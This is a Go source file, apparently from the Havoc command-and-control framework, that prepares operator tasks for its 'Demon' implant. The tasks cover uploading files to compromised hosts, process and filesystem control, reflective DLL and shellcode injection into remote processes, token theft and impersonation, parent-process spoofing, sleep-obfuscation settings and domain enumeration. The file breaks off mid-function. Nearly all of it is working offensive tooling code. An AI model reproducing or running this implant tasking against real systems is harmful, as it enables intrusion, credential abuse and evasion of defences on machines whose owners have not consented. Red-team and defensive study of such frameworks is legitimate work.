package agent

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/common"
	"Havoc/pkg/common/parser"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"
	"Havoc/pkg/socks"
	"Havoc/pkg/utils"
	"Havoc/pkg/win32"

	"github.com/olekukonko/tablewriter"
)

// we upload heavy files to the implant in chunks, so SMB agents can handle the size
func (a *Agent) UploadMemFileInChunks(FileData []byte) uint32 {
	var ID uint32
	var chunkSize = DEMON_MAX_RESPONSE_LENGTH

	// generate a random ID
	ID = rand.Uint32()

	FileSize := len(FileData)
	// split the file in chunks of DEMON_MAX_RESPONSE_LENGTH
	for start := 0; start <= FileSize; start += chunkSize {
		end := start + chunkSize

		// necessary check to avoid slicing beyond FileData capacity
		if end > FileSize {
			end = FileSize
		}

		MemFileJob := Job{
			Command:   COMMAND_MEM_FILE,
			RequestID: rand.Uint32(),
			Data: []any{
				ID,
				uint64(FileSize),
				FileData[start:end],
			},
		}

		a.AddJobToQueue(MemFileJob)
	}

	return ID
}

func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID string, Message map[string]string)) error {

	var Commands = strings.Split(Command, "::")

	switch Commands[0] {

	case "task":
		if len(Commands) > 1 {
			switch Commands[1] {

			case "list":
				if len(a.JobQueue) > 0 {
					var ListTable string

					ListTable += "\n"
					ListTable += fmt.Sprintf(" %-8s  %-19s  %-8s  %s\n", "Task ID", "Created", "Size", "Command")
					ListTable += fmt.Sprintf(" %-8s  %-19s  %-8s  %s\n", "-------", "-------", "----", "-------")

					for _, task := range a.JobQueue {
						var (
							Payload = BuildPayloadMessage([]Job{task}, a.Encryption.AESKey, a.Encryption.AESIv)
							Size    = common.ByteCountSI(int64(len(Payload)))
						)
						ListTable += fmt.Sprintf(" %-8s  %-19s  %-8s  %s\n", task.TaskID, task.Created, Size, task.CommandLine)
					}

					Console(a.NameID, map[string]string{
						"Type":    "Info",
						"Message": "List task queue:",
						"Output":  ListTable,
					})
				} else {
					Console(a.NameID, map[string]string{
						"Type":    "Error",
						"Message": "No jobs in task queue",
					})
				}
				break

			case "clear":
				if len(a.JobQueue) > 0 {
					var Jobs = len(a.JobQueue)
					a.JobQueue = nil
					Console(a.NameID, map[string]string{
						"Type":    "Good",
						"Message": fmt.Sprintf("Cleared task queue [%v]", Jobs),
					})
				} else {
					Console(a.NameID, map[string]string{
						"Type":    "Error",
						"Message": "No jobs in task queue",
					})
				}
				break

			}
		}
		break

	}

	return nil
}

func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, ClientID string, teamserver TeamServer) (*Job, error) {
	var (
		job = &Job{
			Command:   uint32(Command),
			RequestID: rand.Uint32(),
			Data:      []interface{}{},
			Created:   time.Now().UTC().Format("02/01/2006 15:04:05"),
		}
		err error
	)

	Optional := Info.(map[string]interface{})

	if val, ok := Optional["CommandLine"]; ok {
		job.CommandLine = val.(string)
	}

	if val, ok := Optional["TaskID"]; ok {
		job.TaskID = val.(string)

		RequestID, err := strconv.ParseInt(job.TaskID, 16, 64)
		if err == nil {
			job.RequestID = uint32(RequestID)
		}
	}

	switch Command {

	case COMMAND_EXIT:

		if val, ok := Optional["ExitMethod"].(string); ok {
			var Exit int = 0

			if val == "thread" {
				Exit = 1
			} else if val == "process" {
				Exit = 2
			}

			job.Data = []interface{}{
				Exit,
			}
		} else {
			return nil, errors.New("ExitMethod not found")
		}

		break

	case COMMAND_CHECKIN:
		break

	case COMMAND_SLEEP:
		var (
			Delay    int
			Jitter   int
			err      error
			ArgArray []string
		)

		ArgArray = strings.Split(Optional["Arguments"].(string), ";")

		Delay, err = strconv.Atoi(ArgArray[0])
		if err != nil {
			return nil, err
		}

		Jitter, err = strconv.Atoi(ArgArray[1])
		if err != nil {
			return nil, err
		}

		job.Data = []interface{}{
			Delay,
			Jitter,
		}

	case COMMAND_FS:
		var (
			Arguments  = Optional["Arguments"].(string)
			SubCommand = 0
		)

		switch Optional["SubCommand"].(string) {
		case "dir":
			SubCommand = 1

			var (
				SubDirs int
				FilesOnly int
				DirsOnly int
				ListOnly int
			)

			ArgArray  := strings.Split(Arguments, ";")
			Path      := ArgArray[0]
			Starts    := ArgArray[5];
			Contains  := ArgArray[6];
			Ends      := ArgArray[7];

			if ArgArray[1] == "true" {
				SubDirs = win32.TRUE
			} else {
				SubDirs = win32.FALSE
			}
			if ArgArray[2] == "true" {
				FilesOnly = win32.TRUE
			} else {
				FilesOnly = win32.FALSE
			}

			if ArgArray[3] == "true" {
				DirsOnly = win32.TRUE
			} else {
				DirsOnly = win32.FALSE
			}

			if ArgArray[4] == "true" {
				ListOnly = win32.TRUE
			} else {
				ListOnly = win32.FALSE
			}

			// go from \\server\share to \\server\share\
			if strings.HasPrefix(Path, "\\\\") {
				uncIndex := strings.Index(Path[2:], "\\")
				if uncIndex != -1 && strings.Index(Path[uncIndex+3:], "\\") == -1 {
					Path += "\\" 
				}
			}

			// If the file ends in \ or is a drive (C:), throw a * on there
			if strings.HasSuffix(Path, "\\") {
				Path += "*"
			} else if strings.HasSuffix(Path, ":") {
				Path += "\\*"
			}

			job.Data = []interface{}{
				SubCommand,
				win32.FALSE,
				common.EncodeUTF16(Path),
				SubDirs,
				FilesOnly,
				DirsOnly,
				ListOnly,
				common.EncodeUTF16(Starts),
				common.EncodeUTF16(Contains),
				common.EncodeUTF16(Ends),
			}
			break

		case "dir;ui":
			SubCommand = 1

			// go from \\server\share to \\server\share\
			if strings.HasPrefix(Arguments, "\\\\") {
				uncIndex := strings.Index(Arguments[2:], "\\")
				if uncIndex != -1 && strings.Index(Arguments[uncIndex+3:], "\\") == -1 {
					Arguments += "\\"
				}
			}

			// If the file ends in \ or is a drive (C:), throw a * on there
			if strings.HasSuffix(Arguments, "\\") {
				Arguments += "*"
			} else if strings.HasSuffix(Arguments, ":") {
				Arguments += "\\*"
			}

			job.Data = []interface{}{
				SubCommand,
				win32.TRUE,
				common.EncodeUTF16(Arguments),
				win32.FALSE,
				win32.FALSE,
				win32.FALSE,
				win32.FALSE,
				common.EncodeUTF16(""),
				common.EncodeUTF16(""),
				common.EncodeUTF16(""),
			}
			break

		case "download":
			SubCommand = 2

			var (
				FileName []byte
				ArgArray []string
			)

			ArgArray = strings.Split(Arguments, ";")

			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
				FileName = []byte(common.EncodeUTF16(string(val)))
			} else {
				return nil, err
			}

			job.Data = []interface{}{
				SubCommand,
				FileName,
			}
			break

		case "upload":
			var (
				FileName  []byte
				Content   []byte
				ArgArray  []string
				MemFileId uint32
			)

			ArgArray = strings.Split(Arguments, ";")

			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
				FileName = append([]byte(common.EncodeUTF16(string(val))), []byte{0, 0}...)
			} else {
				return nil, err
			}

			if val, err := base64.StdEncoding.DecodeString(ArgArray[1]); err == nil {
				Content = val
			} else {
				return nil, err
			}

			MemFileId = a.UploadMemFileInChunks(Content)

			SubCommand = 3
			job.Data = []interface{}{
				SubCommand,
				FileName,
				MemFileId,
			}
			break

		case "cd":
			SubCommand = 4
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case "remove":
			SubCommand = 5
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case "mkdir":
			SubCommand = 6
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case "cp":
			SubCommand = 7

			var Paths = strings.Split(Arguments, ";")
			if len(Paths) >= 2 {
				var (
					PathFrom []byte
					PathTo   []byte
				)

				if val, err := base64.StdEncoding.DecodeString(Paths[0]); err == nil {
					PathFrom = []byte(common.EncodeUTF16(string(val)))
				} else {
					return nil, err
				}

				if val, err := base64.StdEncoding.DecodeString(Paths[1]); err == nil {
					PathTo = []byte(common.EncodeUTF16(string(val)))
				} else {
					return nil, err
				}

				job.Data = []interface{}{
					SubCommand,
					PathFrom,
					PathTo,
				}
			}

			break

                case "mv":
                        SubCommand = 8

                        var Paths = strings.Split(Arguments, ";")
                        if len(Paths) >= 2 {
                                var (
                                        PathFrom []byte
                                        PathTo   []byte
                                )

                                if val, err := base64.StdEncoding.DecodeString(Paths[0]); err == nil {
                                        PathFrom = []byte(common.EncodeUTF16(string(val)))
                                } else {
                                        return nil, err
                                }

                                if val, err := base64.StdEncoding.DecodeString(Paths[1]); err == nil {
                                        PathTo = []byte(common.EncodeUTF16(string(val)))
                                } else {
                                        return nil, err
                                }

                                job.Data = []interface{}{
                                        SubCommand,
                                        PathFrom,
                                        PathTo,
                                }
                        }

                        break

		case "pwd":
			SubCommand = 9
			job.Data = []interface{}{
				SubCommand,
			}
			break

		case "cat":
			SubCommand = 10

			var (
				FileName []byte
				ArgArray []string
			)

			ArgArray = strings.Split(Arguments, ";")

			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
				FileName = []byte(common.EncodeUTF16(string(val)))
			} else {
				return nil, err
			}

			job.Data = []interface{}{
				SubCommand,
				FileName,
			}
			break
		}

	case COMMAND_PROC:
		var (
			SubCommand, _ = strconv.Atoi(Optional["ProcCommand"].(string))
			Arguments     = Optional["Args"].(string)
		)

		switch SubCommand {
		case DEMON_COMMAND_PROC_MODULES:
			var pid, _ = strconv.Atoi(Arguments)
			job.Data = []interface{}{
				SubCommand,
				pid,
			}
			break

		case DEMON_COMMAND_PROC_GREP:
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case DEMON_COMMAND_PROC_CREATE:

			var (
				Args           = strings.Split(Arguments, ";")
				Process        string
				ProcessArgs    string
				ProcessState   int
				ProcessPiped   int
				ProcessVerbose int
			)

			// State, Verbose, Piped, ProcessApp, ProcessArg
			ProcessState, err := strconv.Atoi(Args[0])
			if err != nil {
				logger.Error("")
			}

			ProcessVerbose = 0
			if strings.ToLower(Args[1]) == "true" {
				ProcessVerbose = 1
			}

			ProcessPiped = 0
			if strings.ToLower(Args[2]) == "true" {
				ProcessPiped = 1
			}

			Process = string(Args[3])

			ProcArgs, _ := base64.StdEncoding.DecodeString(Args[4])
			ProcessArgs = string(ProcArgs)

			job.Data = []interface{}{
				SubCommand,
				ProcessState,
				common.EncodeUTF16(Process),
				common.EncodeUTF16(ProcessArgs),
				ProcessPiped,
				ProcessVerbose,
			}

			break

		// TODO: is this used?
		case 5:
			var State = 0
			if Optional["Args"] == "on" {
				State = 1
			}

			job.Data = []interface{}{
				SubCommand,
				State,
			}

			break

		case DEMON_COMMAND_PROC_MEMORY:
			var (
				Args        = strings.Split(Arguments, " ")
				QueryProtec int
			)

			var (
				ProcID, _ = strconv.Atoi(Args[0])
			)

			switch Args[1] {

			case "PAGE_NOACCESS":
				QueryProtec = win32.PAGE_NOACCESS

			case "PAGE_READONLY":
				QueryProtec = win32.PAGE_READONLY

			case "PAGE_READWRITE":
				QueryProtec = win32.PAGE_READWRITE

			case "PAGE_WRITECOPY":
				QueryProtec = win32.PAGE_WRITECOPY

			case "PAGE_EXECUTE":
				QueryProtec = win32.PAGE_EXECUTE

			case "PAGE_EXECUTE_READ":
				QueryProtec = win32.PAGE_EXECUTE_READ

			case "PAGE_EXECUTE_READWRITE":
				QueryProtec = win32.PAGE_EXECUTE_READWRITE

			case "PAGE_EXECUTE_WRITECOPY":
				QueryProtec = win32.PAGE_EXECUTE_WRITECOPY

			case "PAGE_GUARD":
				QueryProtec = win32.PAGE_GUARD
			}

			job.Data = []interface{}{
				SubCommand,
				ProcID,
				QueryProtec,
			}

			break

		case DEMON_COMMAND_PROC_KILL:
			var pid, err = strconv.Atoi(Arguments)
			if err != nil {
				logger.Debug("proc::kill failed to parse pid: " + err.Error())
				return nil, errors.New("proc::kill failed to parse pid: " + err.Error())
			} else {
				job.Data = []interface{}{
					SubCommand,
					pid,
				}
			}

			break
		}

		break

	case COMMAND_PROC_LIST:
		var (
			ProcessUI = Optional["FromProcessManager"].(string)
			Value     = win32.FALSE
		)

		if ProcessUI == "true" {
			Value = win32.TRUE
		}

		job.Data = []interface{}{
			Value,
		}

		break

	case COMMAND_PROC_PPIDSPOOF:
		var PPIDSpoof, err = strconv.Atoi(Optional["PPID"].(string))
		if err != nil {
			logger.Error(err)
			break
		}

		job.Data = []interface{}{
			uint32(PPIDSpoof),
		}

		break

	case COMMAND_INLINEEXECUTE:
		var (
			FunctionName string
			ObjectFile   []byte
			Parameters   []byte
			Flags        uint32
			BofFileId    uint32
			ParamsFileId uint32
			ok           bool
		)

		if Arguments, ok := Optional["HasCallback"].(string); ok && Arguments == "true" {
			// if there is a callback for this BOF, means that we need to
			// store all the output and send it back to the python module
			// instead of simply printing it on the console

			var bofcallback = &BofCallback{
				TaskID:   job.RequestID,
				Output:   "",
				Error:    "",
				ClientID: ClientID,
			}

			a.BofCallbacks = append(a.BofCallbacks, bofcallback)
		}

		if Arguments, ok := Optional["Arguments"].(string); ok {
			if Parameters, err = base64.StdEncoding.DecodeString(Arguments); !ok {
				return nil, errors.New("FunctionName not defined")
			}
		} else {
			return nil, errors.New("CoffeeLdr: Arguments not defined")
		}

		if Binary, ok := Optional["Binary"].(string); ok {
			if ObjectFile, err = base64.StdEncoding.DecodeString(Binary); err != nil {
				logger.Debug("Failed to turn base64 encoded object file into bytes: " + err.Error())
				return nil, err
			}
		}

		BofFileId    = a.UploadMemFileInChunks(ObjectFile)
		// a BOF can have an entire PE in its parameters, so chunk them
		ParamsFileId = a.UploadMemFileInChunks(Parameters)

		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
			return nil, errors.New("CoffeeLdr: FunctionName not defined")
		}

		if ObjectFlags, ok := Optional["Flags"].(string); ok {

			switch strings.ToLower(ObjectFlags) {
			case "non-threaded":
				Flags = COFFEELDR_FLAG_NON_THREADED
				break

			case "threaded":
				Flags = COFFEELDR_FLAG_THREADED
				break

			case "default":
				Flags = COFFEELDR_FLAG_DEFAULT
				break

			default:
				Flags = 0
			}

		} else {
			return nil, errors.New("CoffeeLdr: Flags not defined")
		}

		job.Data = []interface{}{
			FunctionName,
			BofFileId,
			ParamsFileId,
			Flags,
		}

		break

	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
		var (
			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
			arguments        = common.EncodeUTF16(Optional["Arguments"].(string))
			NetVersion       = common.EncodeUTF16("v4.0.30319")
			PipePath         = common.EncodeUTF16(common.GeneratePipeName(teamserver.GetDotNetPipeTemplate(), a.Info.ProcessPID, a.Info.ProcessTID))
			AppDomainName    = common.EncodeUTF16("DefaultDomain")
			MemFileId        uint32
		)

		MemFileId = a.UploadMemFileInChunks(binaryDecoded)

		job.Data = []interface{}{
			PipePath,
			AppDomainName,
			NetVersion,
			MemFileId,
			arguments,
		}

	case COMMAND_ASSEMBLY_LIST_VERSIONS:
		break

	case COMMAND_SPAWNDLL:
		var (
			Binary, _            = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
			Args, _              = base64.StdEncoding.DecodeString(Optional["Arguments"].(string))
			DllReflectiveLdrPath string
			DllReflectiveLdr     []byte
		)

		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"

		DllReflectiveLdr, err := os.ReadFile(DllReflectiveLdrPath)
		if err != nil {
			return nil, errors.New("Couldn't read content of file: " + err.Error())
		}

		job.Data = []interface{}{
			DllReflectiveLdr,
			Binary,
			Args,
		}

		break

	case COMMAND_JOB:
		var (
			SubCommand int
			JobID      int
			err        error
		)

		if val, ok := Optional["Command"].(string); ok {
			switch val {
			case "list":
				SubCommand = 0x1
				break

			case "suspend":
				SubCommand = 0x2
				break

			case "resume":
				SubCommand = 0x3
				break

			case "kill":
				SubCommand = 0x4
				break
			}
		}

		if val, ok := Optional["Param"].(string); ok {
			JobID, err = strconv.Atoi(val)
			if err != nil {
				return job, errors.New("couldn't convert JobID to int")
			}
		}

		if SubCommand == 0x1 {
			job.Data = []interface{}{
				SubCommand,
			}
		} else {
			job.Data = []interface{}{
				SubCommand,
				JobID,
			}
		}

		break

	case COMMAND_INJECT_DLL:
		var (
			binaryDecoded, _     = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
			TargetPID, _         = strconv.Atoi(Optional["PID"].(string))
			Param, _             = Optional["Arguments"].(string)
			InjectMethode        int
			DllReflectiveLdr     []byte
			DllReflectiveLdrPath string
		)

		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"

		DllReflectiveLdr, err := os.ReadFile(DllReflectiveLdrPath)
		if err != nil {
			return nil, errors.New("Couldn't read content of file: " + err.Error())
		}

		job.Data = []interface{}{
			InjectMethode, // Injection technique syscall
			TargetPID,
			DllReflectiveLdr,
			binaryDecoded,
			Param,
		}
		break

	case COMMAND_INJECT_SHELLCODE:

		var (
			x64       int
			Technique int
			Argument  []byte
		)

		if val, ok := Optional["Way"]; ok {

			if val.(string) == "Inject" {
				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
				if err != nil {
					return job, err
				}

				if _, ok := Optional["Argument"]; ok {
					args, err := base64.StdEncoding.DecodeString(Optional["Argument"].(string))
					if err != nil {
						return job, err
					}

					if len(args) > 0 {
						Argument = args
					}
				}

				TargetPid, err := strconv.Atoi(Optional["PID"].(string))
				if err != nil {
					return job, err
				}

				switch strings.ToLower(Optional["Technique"].(string)) {
				case "default":
					Technique = THREAD_METHOD_DEFAULT
					break

				case "createremotethread":
					Technique = THREAD_METHOD_CREATEREMOTETHREAD
					break

				case "ntcreatethreadex":
					Technique = THREAD_METHOD_NTCREATEHREADEX
					break

				case "ntqueueapcthread":
					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
					break

				default:
					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
				}

				x64 = win32.FALSE
				if Optional["Arch"] == "x64" {
					x64 = win32.TRUE
				}

				job.Data = []interface{}{
					INJECT_WAY_INJECT,
					Technique,
					x64,
					Binary,
					Argument,
					TargetPid,
				}
			} else if val.(string) == "Spawn" {
				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
				if err != nil {
					return job, err
				}

				if _, ok := Optional["Argument"]; ok {
					args, err := base64.StdEncoding.DecodeString(Optional["Argument"].(string))
					if err != nil {
						return job, err
					}

					if len(args) > 0 {
						Argument = args
					}
				}

				switch strings.ToLower(Optional["Technique"].(string)) {
				case "default":
					Technique = THREAD_METHOD_DEFAULT
					break

				case "createremotethread":
					Technique = THREAD_METHOD_CREATEREMOTETHREAD
					break

				case "ntcreatethreadex":
					Technique = THREAD_METHOD_NTCREATEHREADEX
					break

				case "ntqueueapcthread":
					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
					break

				default:
					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
				}

				x64 = win32.FALSE
				if Optional["Arch"] == "x64" {
					x64 = win32.TRUE
				}

				job.Data = []interface{}{
					INJECT_WAY_SPAWN,
					Technique,
					x64,
					Binary,
					Argument,
				}
			} else if val.(string) == "Execute" {
				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
				if err != nil {
					return job, err
				}

				if _, ok := Optional["Argument"]; ok {
					args, err := base64.StdEncoding.DecodeString(Optional["Argument"].(string))
					if err != nil {
						return job, err
					}

					if len(args) > 0 {
						Argument = args
					}
				}

				switch strings.ToLower(Optional["Technique"].(string)) {
				case "default":
					Technique = THREAD_METHOD_DEFAULT
					break

				case "createremotethread":
					Technique = THREAD_METHOD_CREATEREMOTETHREAD
					break

				case "ntcreatethreadex":
					Technique = THREAD_METHOD_NTCREATEHREADEX
					break

				case "ntqueueapcthread":
					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
					break

				default:
					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
				}

				x64 = win32.FALSE
				if Optional["Arch"] == "x64" {
					x64 = win32.TRUE
				}

				job.Data = []interface{}{
					INJECT_WAY_EXECUTE,
					Technique,
					x64,
					Binary,
					Argument,
				}
			} else {
				return job, errors.New("couldn't identify if injection or spawn is specified")
			}

		} else {
			return job, errors.New("inject option not specified")
		}

		break

	case COMMAND_TOKEN:
		var (
			SubCommand int
			Arguments  any
			err        error
		)

		if val, ok := Optional["SubCommand"].(string); ok {
			switch val {
			case "impersonate":
				SubCommand = 0x1

				if val, ok := Optional["Arguments"].(string); ok {
					Arguments, err = strconv.Atoi(val)
					if err != nil {
						return job, errors.New("Failed to convert TokenID to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						Arguments.(int),
					}
				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "steal":
				SubCommand = 0x2

				if val, ok := Optional["Arguments"].(string); ok {

					var (
						PID       int
						Handle    int64
						ArrayData []string
					)

					ArrayData = strings.Split(val, ";")

					PID, err = strconv.Atoi(ArrayData[0])
					if err != nil {
						return job, errors.New("Failed to convert PID to int: " + err.Error())
					}

					Handle, err = strconv.ParseInt(ArrayData[1], 16, 64)
					if err != nil {
						return job, errors.New("Failed to convert Handle to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						PID,
						int(Handle),
					}
				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "list":
				SubCommand = 0x3

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "privs-list":
				SubCommand = 0x4

				job.Data = []interface{}{
					SubCommand,
					win32.TRUE,
				}

				break

			case "privs-get":
				SubCommand = 0x4

				if PrivName, ok := Optional["Arguments"].(string); ok {

					job.Data = []interface{}{
						SubCommand,
						win32.FALSE,
						PrivName,
					}

				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "make":
				SubCommand = 0x5

				if val, ok = Optional["Arguments"].(string); ok {

					var (
						Domain    string
						User      string
						Password  string
						LogonType int

						ArrayData []string
					)

					ArrayData = strings.Split(val, ";")

					if val, err := base64.StdEncoding.DecodeString(ArrayData[0]); err != nil {
						return job, errors.New("Failed to decode Domain: " + err.Error())
					} else {
						Domain = string(val)
					}

					if val, err := base64.StdEncoding.DecodeString(ArrayData[1]); err != nil {
						return job, errors.New("Failed to decode User: " + err.Error())
					} else {
						User = string(val)
					}

					if val, err := base64.StdEncoding.DecodeString(ArrayData[2]); err != nil {
						return job, errors.New("Failed to decode Password: " + err.Error())
					} else {
						Password = string(val)
					}

					LogonType, err = strconv.Atoi(ArrayData[3])
					if err != nil {
						return job, errors.New("Failed to convert LogonType to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						common.EncodeUTF16(Domain),
						common.EncodeUTF16(User),
						common.EncodeUTF16(Password),
						LogonType,
					}

					logger.Debug(job.Data)

				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "getuid":
				SubCommand = 0x6

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "revert":
				SubCommand = 0x7

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "remove":
				SubCommand = 0x8

				if val, ok := Optional["Arguments"].(string); ok {
					Arguments, err = strconv.Atoi(val)
					if err != nil {
						return job, errors.New("Failed to convert TokenID to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						Arguments.(int),
					}
				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "clear":
				SubCommand = 0x9

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "find":
				SubCommand = 0xa

				job.Data = []interface{}{
					SubCommand,
				}

				break
			}
		}
		break

	case COMMAND_CONFIG:

		var (
			ConfigKey = Optional["ConfigKey"]
			ConfigVal = Optional["ConfigVal"]

			ConfigId int
			Value    any
		)

		switch ConfigKey {

		case "implant.verbose":
			ConfigId = CONFIG_IMPLANT_VERBOSE

			if ConfigVal == "true" {
				Value = 1
			} else {
				Value = 0
			}

			break

		case "implant.sleep-obf.start-addr":
			ConfigId = CONFIG_IMPLANT_SPFTHREADSTART

			var (
				Library   = strings.Split(ConfigVal.(string), "!")[0]
				Function  = strings.Split(ConfigVal.(string), "!")[1]
				OffsetStr = strings.Split(ConfigVal.(string), "+")[1]
			)

			OffsetStr = strings.Replace(OffsetStr, "0x", "", -1)
			Offset, err := strconv.ParseInt(OffsetStr, 16, 64)

			if err != nil {
				logger.Error("Failed to convert hex string to int: " + err.Error())
			}

			Function = strings.Split(Function, "+")[0]

			job.Data = []interface{}{
				ConfigId,
				Library,
				Function,
				Offset,
			}

			break

		case "implant.sleep-obf.technique":
			ConfigId = CONFIG_IMPLANT_SLEEP_TECHNIQUE

			var Num, err = strconv.Atoi(ConfigVal.(string))
			if err != nil {
				logger.Error("Failed to convert string to num: " + err.Error())
			}

			job.Data = []interface{}{
				ConfigId,
				Num,
			}

		case "implant.coffee.veh":
			ConfigId = CONFIG_IMPLANT_COFFEE_VEH

			if ConfigVal == "true" {
				Value = 1
			} else {
				Value = 0
			}
			break

		case "implant.coffee.threaded":
			ConfigId = CONFIG_IMPLANT_COFFEE_THREADED

			if ConfigVal == "true" {
				Value = 1
			} else {
				Value = 0
			}

			break

		case "memory.alloc":
			ConfigId = CONFIG_MEMORY_ALLOC
			Value, _ = strconv.Atoi(ConfigVal.(string))

			break

		case "memory.execute":
			ConfigId = CONFIG_MEMORY_EXECUTE
			Value, _ = strconv.Atoi(ConfigVal.(string))
			break

		case "inject.technique":
			ConfigId = CONFIG_INJECT_TECHNIQUE
			Value, _ = strconv.Atoi(ConfigVal.(string))
			break

		case "inject.spoofaddr":
			ConfigId = CONFIG_INJECT_SPOOFADDR

			var (
				Library   = strings.Split(ConfigVal.(string), "!")[0]
				Function  = strings.Split(ConfigVal.(string), "!")[1]
				OffsetStr = strings.Split(ConfigVal.(string), "+")[1]
			)

			OffsetStr = strings.Replace(OffsetStr, "0x", "", -1)
			Offset, err := strconv.ParseInt(OffsetStr, 16, 64)

			if err != nil {
				logger.Error("Failed to convert hex string to int: " + err.Error())
			}

			Function = strings.Split(Function, "+")[0]

			job.Data = []interface{}{
				ConfigId,
				Library,
				Function,
				Offset,
			}
			break

		case "inject.spawn64":
			ConfigId = CONFIG_INJECT_SPAWN64
			Value = common.EncodeUTF16(ConfigVal.(string))
			break

		case "inject.spawn32":
			ConfigId = CONFIG_INJECT_SPAWN32
			Value = common.EncodeUTF16(ConfigVal.(string))
			break

		case "killdate":
			ConfigId = CONFIG_KILLDATE
			var (
				KillDate int64
			)
			if ConfigVal.(string) != "0" {
				t, err := time.Parse("2006-01-02 15:04:05", ConfigVal.(string))
				if err != nil {
					logger.Error("Failed to parse the kill date: " + err.Error())
					return nil, errors.New("Invalid date format, use: 2006-01-02 15:04:05")
				} else {
					KillDate = t.Unix()
					if KillDate < time.Now().Unix() {
						return nil, errors.New("The date can't be in the past")
					}
					KillDate = common.EpochTimeToSystemTime(KillDate)
				}
			} else {
				KillDate = 0
			}

			logger.Debug(fmt.Sprintf("KillDate: %d", KillDate))

			job.Data = []interface{}{
				ConfigId,
				KillDate,
			}
			break

		case "workinghours":
			ConfigId = CONFIG_WORKINGHOURS
			var (
				WorkingHours int32
			)
			if ConfigVal.(string) != "0" {
				WorkingHours, err = common.ParseWorkingHours(ConfigVal.(string))
				if err != nil {
					return nil, err
				}
			} else {
				WorkingHours = 0
			}

			logger.Debug(fmt.Sprintf("WorkingHours: %d", WorkingHours))

			job.Data = []interface{}{
				ConfigId,
				WorkingHours,
			}
			break
		}

		if len(job.Data) == 0 {
			job.Data = []interface{}{
				ConfigId,
				Value,
			}
		}

		break

	case COMMAND_SCREENSHOT:
		break

	case COMMAND_NET:
		var (
			NetCommand int
			Param      string
		)

		if val, ok := Optional["NetCommand"]; ok {
			NetCommand, err = strconv.Atoi(val.(string))
			if err != nil {
				logger.Debug("Failed to parse net command: " + err.Error())
				return nil, err
			}
		} else {
			return nil, errors.New("command::net NetCommand not defined")
		}

		if val, ok := Optional["Param"]; ok {
			Param = val.(string)
		} else {
			return nil, errors.New("command::net param not defined")
		}

		switch NetCommand {
		case DEMON_NET_COMMAND_DOMAIN:
			job.Data = []interface{}{
				NetCommand,
			}
			break

		case DEMON_NET_COMMAND_LOGONS:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_SESSIONS:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_COMPUTER:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_DCLIST:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_SHARE:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_LOCALGROUP:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_GROUP:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_USERS:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		default:

		}

		break

	case COMMAND_PIVOT:
		var (
			PivotCommand int
			Param        string
		)

		if val, ok := Optional["Param"]; ok {
			Param = val.(string)
		}

		if val, ok := Optional["Command"]; ok {

			if val, err := strconv.Atoi(val.(string)); err != nil {
				logger.Debug("failed to convert pivot command to int: " + err.Error())
				return nil, errors.New("failed to convert pivot command to int: " + err.Error())
			} else {
				PivotCommand = val
			}

		}

